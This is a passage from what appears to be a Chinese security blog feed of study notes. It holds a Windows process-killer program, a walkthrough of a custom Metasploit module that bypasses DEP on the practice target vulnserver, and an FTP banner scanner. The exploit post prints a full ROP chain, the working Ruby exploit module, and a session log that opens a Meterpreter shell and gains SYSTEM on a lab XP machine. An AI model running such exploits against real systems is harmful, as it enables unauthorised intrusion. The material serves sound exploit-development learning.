class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StopProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> processID;</span><br><span class="line">HANDLE hProcess;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入进程ID：&quot;</span>;</span><br><span class="line">cin &gt;&gt; processID;</span><br><span class="line"><span class="comment">//用函数 TerminateProcess()终止进程：</span></span><br><span class="line"><span class="comment">//PROCESS_ALL_ACCESS,最高权限</span></span><br><span class="line">hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, TRUE, processID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;未找到ID为&quot;</span> &lt;&lt; processID &lt;&lt; <span class="string">&quot;的进程！\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">TerminateProcess</span>(hProcess, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请选择操作指令（1.遍历进程，2.关闭进程,3.退出）： &quot;</span>;</span><br><span class="line">cin &gt;&gt; num;</span><br><span class="line"><span class="keyword">while</span> (num!=<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">GetProcess</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">StopProcess</span>();</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请选择操作指令（1.遍历进程，2.关闭进程,3.退出）： &quot;</span>;</span><br><span class="line">cin &gt;&gt; num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="测试">3. 测试</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dcb86665cd.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dcb9eb8111.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dcbaf0e245.png" /></p>
]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>系统编程</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义 Metasploit 模块绕过 DEP</title>
    <url>/2021/11/28/%E8%87%AA%E5%AE%9A%E4%B9%89%20Metasploit%20%E6%A8%A1%E5%9D%97%E7%BB%95%E8%BF%87%20DEP/</url>
    <content><![CDATA[<p><strong>备注：相关理论知识建议查看书籍</strong></p>
<h2 id="实验环境">1. 实验环境</h2>
<p><strong>攻击机：kali 2019-3</strong></p>
<p><strong>靶机：winXPSP3（英文版）</strong></p>
<p><strong>漏洞：vulnserver.exe（下载：<a
href="https://github.com/stephenbradshaw/vulnserver"
class="uri">https://github.com/stephenbradshaw/vulnserver</a>）</strong></p>
<h2 id="启用mona脚本">2. 启用Mona脚本</h2>
<h3 id="查找所有会被加载-.dll-文件">1、查找所有会被加载 .dll 文件</h3>
<h4
id="在靶机的命令行中切换到vlunserver.exe所在的目录执行如下命令">（1）在靶机的命令行中切换到vlunserver.exe所在的目录，执行如下命令</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vlunserver.exe 9999</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128155612239-1067443417.png" /></p>
<h4 id="使用immunitydebugger查询">（2）使用ImmunityDebugger查询</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128155658186-1976100869.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128155912313-1763646230.png" /></p>
<ul>
<li><strong>输入命令 !mona modules
启用Mona脚本，就可以找到所有模块的信息。</strong></li>
<li><strong>不过为了构建ROP链，需要在这些DLL文件中找到所有可执行ROP的指令片段</strong></li>
</ul>
<h3 id="使用-msfrop-也可查找-rop-指令片段穿插补充">2、使用 msfrop
也可查找 ROP 指令片段（穿插补充）</h3>
<p><strong>msfrop 命令（以msvcrt.dll为例）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; msfrop -v -s <span class="string">&quot;pop cex&quot;</span> /root/Desktop/msvcrt.dll　　　　<span class="comment">#使用-s参数进行查找，使用-v实现详细输出</span></span><br><span class="line">[*] <span class="built_in">exec</span>: msfrop -v -s <span class="string">&quot;pop cex&quot;</span> /root/Desktop/msvcrt.dll</span><br><span class="line"></span><br><span class="line">Collecting gadgets from /root/Desktop/msvcrt.dll</span><br><span class="line">Found 2320 gadgets</span><br><span class="line"></span><br><span class="line">/root/Desktop/msvcrt.dll gadget: 0x77c11285</span><br><span class="line">0x77c11285: add [eax], al</span><br><span class="line">0x77c11287: add bl, cl</span><br><span class="line">0x77c11289: dec ebp</span><br><span class="line">0x77c1128a: ret</span><br><span class="line"></span><br><span class="line">/root/Desktop/msvcrt.dll gadget: 0x77c112a9</span><br><span class="line">0x77c112a9: mov eax, 0f88a77c3h</span><br><span class="line">0x77c112ae: ret</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
<h3 id="使用-mona-查找并创建-rop-链">3、使用 Mona 查找并创建 ROP 链</h3>
<p>通过使用immunity调试器中的Mona脚本，
<strong>不仅可以找到ROP指令片段，还可以创建整个ROP链</strong></p>
<p>使用命令 **!mona rop -m *.dll -cp
nonull**就可以找到所有关于ROP代码片段的信息。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128160913684-482281778.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128160927479-515719958.png" /></p>
<p>新生成的
<strong>rop_chains.txt</strong>文件中包含了可以直接用于渗透模块的完整ROP链。我们只需将这个ROP链复制到我们的渗透模块中即可。</p>
<p><strong>为了创建一个可以触发VirtualProtect()函数的ROP链，对寄存器进行的设置（打开rop_chains.txt即可看到）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Register setup <span class="keyword">for</span> VirtualProtect() :</span><br><span class="line">--------------------------------------------</span><br><span class="line"> EAX = NOP (0x90909090)</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class="line"> ESI = ptr to VirtualProtect()</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> --- alternative chain ---</span><br><span class="line"> EAX = ptr to &amp;VirtualProtect()</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = POP (skip 4 bytes)</span><br><span class="line"> ESI = ptr to JMP [EAX]</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> + place ptr to <span class="string">&quot;jmp esp&quot;</span> on stack, below PUSHAD</span><br></pre></td></tr></table></figure>
<p><strong>创建的ROP 链：</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>()</span><br><span class="line"></span><br><span class="line">　　<span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">　　rop_gadgets =</span><br><span class="line">　　[</span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">　　<span class="number">0x77c2d7ba</span>, <span class="comment"># POP ECX # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0x6250609c</span>, <span class="comment"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span></span><br><span class="line">　　<span class="number">0x7e41927f</span>, <span class="comment"># MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]</span></span><br><span class="line">　　<span class="number">0x7c94d192</span>, <span class="comment"># XCHG EAX,ESI # RETN [ntdll.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">　　<span class="number">0x77c42f04</span>, <span class="comment"># POP EBP # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0x625011c7</span>, <span class="comment"># &amp; jmp esp [essfunc.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">　　<span class="number">0x77c4e0da</span>, <span class="comment"># POP EAX # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0xfffffdff</span>, <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">　　<span class="number">0x7e44493b</span>, <span class="comment"># NEG EAX # RETN [USER32.dll]</span></span><br><span class="line">　　<span class="number">0x77f301e4</span>, <span class="comment"># XCHG EAX,EBX # RETN [GDI32.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">　　<span class="number">0x7c87f229</span>, <span class="comment"># POP EAX # RETN [kernel32.dll]</span></span><br><span class="line">　　<span class="number">0xffffffc0</span>, <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">　　<span class="number">0x77eda3d7</span>, <span class="comment"># NEG EAX # RETN [RPCRT4.dll]</span></span><br><span class="line">　　<span class="number">0x77c58fbc</span>, <span class="comment"># XCHG EAX,EDX # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">　　<span class="number">0x77c1f519</span>, <span class="comment"># POP ECX # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0x62504d79</span>, <span class="comment"># &amp;Writable location [essfunc.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">　　<span class="number">0x77c46116</span>, <span class="comment"># POP EDI # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0x77e8d224</span>, <span class="comment"># RETN (ROP NOP) [RPCRT4.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">　　<span class="number">0x77ead9ed</span>, <span class="comment"># POP EAX # RETN [RPCRT4.dll]</span></span><br><span class="line">　　<span class="number">0x90909090</span>, <span class="comment"># nop</span></span><br><span class="line">　　<span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">　　<span class="number">0x77dfc5ee</span>, <span class="comment"># PUSHAD # RETN [ADVAPI32.dll]</span></span><br><span class="line">　　].flatten.pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">return</span> rop_gadgets</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h2 id="编写绕过-dep-的-metasploit-渗透模块">3. 编写绕过 DEP 的
Metasploit 渗透模块</h2>
<h3 id="渗透代码">1、渗透代码</h3>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt;<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Exploit</span><span class="symbol">:</span><span class="symbol">:Remote</span></span><br><span class="line">  <span class="title class_">Rank</span>=<span class="title class_">NormalRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::Tcp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;DEP Bypass Exploit&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        DEP Bypass Using ROP Chains Example Module</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;Windows&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt; [<span class="string">&#x27;z9m8r8&#x27;</span>],</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span>        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;space&#x27;</span>     =&gt; <span class="number">312</span>,</span><br><span class="line">          <span class="string">&#x27;BadChars&#x27;</span>  =&gt; <span class="string">&quot;\x00&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">       <span class="string">&#x27;Targets&#x27;</span>      =&gt; </span><br><span class="line">        [</span><br><span class="line">          [<span class="string">&#x27;Windows XP&#x27;</span>, &#123;<span class="string">&#x27;Offset&#x27;</span>  =&gt; <span class="number">2006</span>&#125;]</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;DisclosureDate&#x27;</span>  =&gt; <span class="string">&#x27;2021-09-26&#x27;</span>))</span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">Opt</span><span class="symbol">:</span><span class="symbol">:RPORT</span>(<span class="number">9999</span>)</span><br><span class="line">      ],<span class="variable language_">self</span>.<span class="keyword">class</span></span><br><span class="line">    )</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">create_rop_chain</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets =</span><br><span class="line">    [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x77c2d7ba</span>,  <span class="comment"># POP ECX # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0x6250609c</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span></span><br><span class="line">      <span class="number">0x7e41927f</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]</span></span><br><span class="line">      <span class="number">0x7c94d192</span>,  <span class="comment"># XCHG EAX,ESI # RETN [ntdll.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x77c42f04</span>,  <span class="comment"># POP EBP # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0x625011c7</span>,  <span class="comment"># &amp; jmp esp [essfunc.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x77c4e0da</span>,  <span class="comment"># POP EAX # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x7e44493b</span>,  <span class="comment"># NEG EAX # RETN [USER32.dll]</span></span><br><span class="line">      <span class="number">0x77f301e4</span>,  <span class="comment"># XCHG EAX,EBX # RETN [GDI32.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x7c87f229</span>,  <span class="comment"># POP EAX # RETN [kernel32.dll]</span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x77eda3d7</span>,  <span class="comment"># NEG EAX # RETN [RPCRT4.dll]</span></span><br><span class="line">      <span class="number">0x77c58fbc</span>,  <span class="comment"># XCHG EAX,EDX # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x77c1f519</span>,  <span class="comment"># POP ECX # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0x62504d79</span>,  <span class="comment"># &amp;Writable location [essfunc.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x77c46116</span>,  <span class="comment"># POP EDI # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0x77e8d224</span>,  <span class="comment"># RETN (ROP NOP) [RPCRT4.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x77ead9ed</span>,  <span class="comment"># POP EAX # RETN [RPCRT4.dll]</span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x77dfc5ee</span>,  <span class="comment"># PUSHAD # RETN [ADVAPI32.dll]</span></span><br><span class="line">    ].flatten.pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop_gadgets</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">    connect</span><br><span class="line">    rop_chain=create_rop_chain()</span><br><span class="line">    junk=rand_text_alpha_upper(target[<span class="string">&#x27;Offset&#x27;</span>])</span><br><span class="line">    buf=<span class="string">&quot;TRUN .&quot;</span>+junk+rop_chain+make_nops(<span class="number">16</span>)+payload.encoded+<span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">    sock.put(buf)</span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h3 id="保存路径">2、保存路径</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test<span class="comment"># ls</span></span><br><span class="line">dep_attack_by_z9m8r8.rb  seh_attack_by_z9m8r8.rb</span><br></pre></td></tr></table></figure>
<h3 id="简要解析">3、简要解析</h3>
<p><strong>exploit函数</strong></p>
<ul>
<li>从rop_chains.txt文件中将Mona脚本产生的create_rop_chain函数复制到渗透代码中</li>
<li>调用create_rop_chain函数，并将完整的ROP链保存到rop_chain变量中</li>
<li>使用rand_text_alpha_upper函数创建了一个包含了2006个随机字符的字符串，并将其保存在一个名为junk的变量中</li>
<li>将命令TRUN与包含了2006个随机字符的junk变量和rop_chain保存在buf变量中</li>
<li>再将一些填充数据和ShellCode添加到buf变量中</li>
</ul>
<h3 id="代码调试">4、代码调试</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test <span class="comment">#../../../../tools/dev/msftidy.rb dep_attack_by_z9m8r8.rb </span></span><br><span class="line">    dep_attack_by_z9m8r8.rb - [INFO] No CVE references found. Please check before you land!</span><br><span class="line">    dep_attack_by_z9m8r8.rb - [ERROR] Unable to determine super class　　<span class="comment">#未解决（super()看了好几遍没发现有什么问题），但msf中依旧可渗透成功！</span></span><br><span class="line">    dep_attack_by_z9m8r8.rb:19 - [WARNING] Spaces at EOL</span><br></pre></td></tr></table></figure>
<h2 id="msf-运行测试">4. msf 运行测试</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/z9m8r8_test/dep_attack_by_z9m8r8 </span><br><span class="line">    msf5 exploit(windows/z9m8r8_test/dep_attack_by_z9m8r8) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">    payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">    msf5 exploit(windows/z9m8r8_test/dep_attack_by_z9m8r8) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (exploit/windows/z9m8r8_test/dep_attack_by_z9m8r8):</span><br><span class="line">    </span><br><span class="line">       Name    Current Setting  Required  Description</span><br><span class="line">       ----    ---------------  --------  -----------</span><br><span class="line">       RHOSTS                   <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT   9999             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Payload options (windows/meterpreter/bind_tcp):</span><br><span class="line">    </span><br><span class="line">       Name      Current Setting  Required  Description</span><br><span class="line">       ----      ---------------  --------  -----------</span><br><span class="line">       EXITFUNC  process          <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">       LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line">       RHOST                      no        The target address</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Exploit target:</span><br><span class="line">    </span><br><span class="line">       Id  Name</span><br><span class="line">       --  ----</span><br><span class="line">       0   Windows XP</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    msf5 exploit(windows/z9m8r8_test/dep_attack_by_z9m8r8) &gt; <span class="built_in">set</span> rhost 10.10.10.131</span><br><span class="line">    rhost =&gt; 10.10.10.131 msf5 exploit(windows /z9m8r8_test/dep_attack_by_z9m8r8) &gt;exploit </span><br><span class="line">    </span><br><span class="line">    [*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.131:4444</span><br><span class="line">    [*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">    [*] Meterpreter session 1 opened (10.10.10.149:40241 -&gt; 10.10.10.131:4444) at 2021-09-26 07:06:01 -0400 meterpreter &gt;getuid </span><br><span class="line">    Server username: DH-CA8822AB9589\Administrator</span><br><span class="line">    meterpreter&gt;getsystem </span><br><span class="line">    ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">    meterpreter&gt;getuid </span><br><span class="line">    Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">    meterpreter &gt;   </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128162045594-1361922937.png" /></p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义FTP扫描模块</title>
    <url>/2021/11/21/%E8%87%AA%E5%AE%9A%E4%B9%89FTP%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h2 id="代码实现">1. 代码实现</h2>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Auxiliary</span> <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::Ftp</span> <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Scanner</span> <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br><span class="line">　　<span class="keyword">def</span> <span class="title function_">initialize</span></span><br><span class="line">　　　　<span class="variable language_">super</span>(</span><br><span class="line">　　　　　　<span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;FTP Version test Scanner&#x27;</span>,</span><br><span class="line">　　　　　　<span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">&#x27;Detect FTP Version.&#x27;</span>,</span><br><span class="line">　　　　　　<span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;z9m8r8&#x27;</span>,</span><br><span class="line">　　　　　　<span class="string">&#x27;License&#x27;</span> =&gt; <span class="variable constant_">MSF_LICENSE</span></span><br><span class="line">　　　　)</span><br><span class="line">　　　　register_options(</span><br><span class="line">　　　　　　[</span><br><span class="line">　　　　　　　　<span class="title class_">Opt</span><span class="symbol">:</span><span class="symbol">:RPORT</span>(<span class="number">21</span>),</span><br><span class="line">　　　　　　],<span class="variable language_">self</span>.<span class="keyword">class</span></span><br><span class="line">　　　　)</span><br><span class="line">　　<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">　　<span class="keyword">def</span> <span class="title function_">run_host</span>(<span class="params">target_host</span>)</span><br><span class="line">　　　　connect(<span class="literal">true</span>,<span class="literal">false</span>)</span><br><span class="line">　　　　<span class="keyword">if</span>(banner)</span><br><span class="line">　　　　　　print_status(<span class="string">&quot;<span class="subst">#&#123;rhost&#125;</span> is running <span class="subst">#&#123;banner&#125;</span>&quot;</span>)</span><br><span class="line">　　　　　　report_service(<span class="symbol">:host</span> =&gt; rhost,<span class="symbol">:port=&gt;rport</span>,<span class="symbol">:name=&gt;<span class="string">&quot;ftp&quot;</span></span>,<span class="symbol">:info=&gt;banner</span>)</span><br><span class="line">　　　　<span class="keyword">end</span></span><br><span class="line">　　　　disconnect</span><br><span class="line">　　<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h2 id="代码解析">2. 代码解析</h2>
<ul>
<li><h3 id="required-msfcore"><strong>required
'msf/core'</strong></h3></li>
</ul>
<p>语句required 'msf/core'，引入core库。</p>
<p>该方法适用于metasploit
的早期版本，但最新的版本不需要单独定义引入core库</p>
<p>实践时反馈的问题，声明类类型为Metasploit3
时，总是报initialize未初始化，但实际已定义initialize并初始化了，将Metasploit3用MetasploitModule代替即可正常运行（备注，真正的问题出在哪里，自己并未解决）</p>
<ul>
<li><h3 id="库文件介绍"><strong>库文件介绍</strong></h3></li>
</ul>
<p><strong>引入语句路径用途</strong></p>
<p>Msf:Exploit::Remote::Ftp /lib/msf/core/exploit/ftp.rb
包含了所有FTP操作相关的方法，比如建立FTP连接、
FTP服务登录、发送FTP命令等</p>
<p>Msf::Auxiliary::Scanner /lib/msf/core/auxiliary/scanner.rb
包含了各种扫描模块要使用的函数，提供了很多方法，例如模块运行、初始化以及进度扫描等</p>
<p>Msf::Auxiliary::Report /lib/msf/core/auxiliary/report.rb
包含了所有报告函数，这些函数可以将正在运行的模块中的数据存储到数据库中</p>
<ul>
<li><h3 id="函数介绍"><strong>函数介绍</strong></h3></li>
</ul>
<p><strong>函 数 库 文 件 用 途</strong></p>
<p>run_host /lib/msf/core/auxiliary/scanner.rb
对每台主机运行一次的主要方法</p>
<p>connect /lib/msf/core/exploit/ftp.rb
负责与主机建立一个连接并抓取banner，然后自动将这个banner保存到变量中</p>
<p>向connect函数提供两个参数：
true和false。参数true定义了全局参数的使用，而false定义关闭模块的详细功能</p>
<p>函数connect的优点在于它能自动连接目标，以及自动将FTP服务的标识保存到名为banner的参数，</p>
<p>report_service /lib/msf/core/auxiliary/report.rb
专门用于将服务和相关细节添加到数据库中</p>
<p>函数report_service，将扫描数据保存在数据库中以供之后使用或者生成高级报告</p>
<ul>
<li><h3 id="保存位置"><strong>保存位置</strong></h3></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/ftp/ftp_test.rb</span><br></pre></td></tr></table></figure>
<ul>
<li><h3
id="调试检查语法错误"><strong>调试检查语法错误</strong></h3></li>
</ul>
<p><strong>使用msftidy调试方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/wins<span class="comment"># /usr/share/metasploit-framework/tools/dev/msftidy.rb test.rb</span></span><br></pre></td></tr></table></figure>
<p><strong>由于实践时msftidy总出错，故是直接通过msfconsole加载失败查看日志改正的，如下</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@promote:/usr/share/metasploit-framework/tools/dev<span class="comment"># msfconsole</span></span><br><span class="line">[!] The following modules could not be loaded!..|</span><br><span class="line">[!] /usr/share/metasploit-framework/modules/auxiliary/scanner/ftp/ftp_test.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure>
<p><strong>打开日志，依据提示进行修改，并重新加载即可</strong></p>
<h2 id="msf-中测试">3. msf 中测试</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ftp/ftp_test</span><br><span class="line">msf6 auxiliary(scanner/ftp/ftp_test) &gt;show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ftp/ftp_test):</span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line">FTPPASS mozilla@example.com no The password <span class="keyword">for</span> the specified username</span><br><span class="line">FTPUSER anonymous no The username to authenticate as</span><br><span class="line">RHOSTS 10.10.10.134 <span class="built_in">yes</span> The target host(s), range CIDR identifier</span><br><span class="line">, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">RPORT 21 <span class="built_in">yes</span> The target port (TCP)</span><br><span class="line">THREADS 10 <span class="built_in">yes</span> The number of concurrent threads (max one</span><br><span 